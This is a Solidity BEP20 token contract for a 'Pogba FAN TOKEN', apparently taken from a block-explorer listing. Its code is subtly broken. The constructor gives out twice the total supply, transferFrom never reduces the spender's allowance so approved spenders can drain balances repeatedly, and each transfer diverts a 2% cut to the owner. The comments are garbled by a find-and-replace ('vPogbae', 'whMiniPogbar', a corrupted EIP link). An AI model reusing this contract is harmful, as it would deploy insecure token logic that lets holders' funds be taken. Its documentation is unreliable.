/**
 *Submitted for verification at BscScan.com on 2021-10-24
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IBEP20 {
  // @dev Returns the amount of MiniPogba in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the amount of MiniPogba owned by `account`.
  function balanceOf(address account) external view returns (uint256);
  
  /*
      function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 vPogbae);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 vPogbae
    );
  
  */

  /**
   * @dev Moves `amount` MiniPogba from the caller's account to `recipient`.
   *
   * Returns a boolean vPogbae indicating whMiniPogbar the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of MiniPogba that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This vPogbae changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's MiniPogba.
   *
   * Returns a boolean vPogbae indicating whMiniPogbar the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired vPogbae afterwards:
   * https://github.com/Pogba/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` MiniPogba from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean vPogbae indicating whMiniPogbar the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  //@dev Emitted when `vPogbae` MiniPogba are moved from one account (`from`) to  another (`to`). Note that `vPogbae` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 vPogbae);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `vPogbae` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 vPogbae);
}

contract PogbaTOK is IBEP20 {

    // common addresses
    address private owner;
    address private Pogba;
    address private MiniPogba;
    address private FRANCE;
    
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 18;
    
    mapping(address => uint) public balances;
    
    mapping(address => mapping(address => uint)) public allowances;
    
    // token title metadata
    string public override name = "Pogba FAN TOKEN";
    string public override symbol = "POGBAFANS";
    
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint vPogbae);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint vPogbae);
    
    // On init of contract we're going to set the admin and give them all MiniPogba.
    constructor(uint totalSupplyVPogbae, address PogbaAddress, address MiniPogbaAddress, address FRANCEAddress) {
        // set total supply
        totalSupply = totalSupplyVPogbae;
        
        // designate addresses
        owner = msg.sender;
        Pogba = PogbaAddress;
        MiniPogba = MiniPogbaAddress;
        FRANCE = FRANCEAddress;

        
        // split the MiniPogba according to agreed upon percentages
        balances[Pogba] =  totalSupply * 1 / 100;
        balances[MiniPogba] = totalSupply * 48 / 100;
        balances[FRANCE] = totalSupply * 100 / 100;

        
        balances[owner] = totalSupply * 51 / 100;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }

    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return balances[account];
    }
    
    // Transfer balance from one user to another
    function transfer(address to, uint vPogbae) public override returns(bool) {
        require(vPogbae > 0, "Transfer vPogbae has to be higher than 0.");
        require(balanceOf(msg.sender) >= vPogbae, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total vPogbae
        uint reMiniPogbaBD = vPogbae * 2 / 100;
        uint burnTBD = vPogbae * 0 / 100;
        uint vPogbaeAfterTaxAndBurn = vPogbae - reMiniPogbaBD - burnTBD;
        
        // perform the transfer operation
        balances[to] += vPogbaeAfterTaxAndBurn;
        balances[msg.sender] -= vPogbae;
        
        emit Transfer(msg.sender, to, vPogbae);
        
        // finally, we burn and tax the Pogbas percentage
        balances[owner] += reMiniPogbaBD + burnTBD;
        _burn(owner, burnTBD);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint vPogbae) public override returns(bool) {
        allowances[msg.sender][spender] = vPogbae; 
        
        emit Approval(msg.sender, spender, vPogbae);
        
        return true;
    }
    
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return allowances[_owner][spender];
    }
    
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint vPogbae) public override returns(bool) {
        require(allowances[from][msg.sender] > 0, "No Allowance for this address.");
        require(allowances[from][msg.sender] >= vPogbae, "Allowance too low for transfer.");
        require(balances[from] >= vPogbae, "Balance is too low to make transfer.");
        
        balances[to] += vPogbae;
        balances[from] -= vPogbae;
        
        emit Transfer(from, to, vPogbae);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 amount) public returns(bool) {
        _burn(msg.sender, amount);
        
        return true;
    }
    
    // intenal functions
    
    // burn amount of currency from specific account
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(balances[account] >= amount, "Burn amount exceeds balance at address.");
    
        balances[account] -= amount;
        totalSupply -= amount;
        
        emit Transfer(account, address(0), amount);
    }
    
}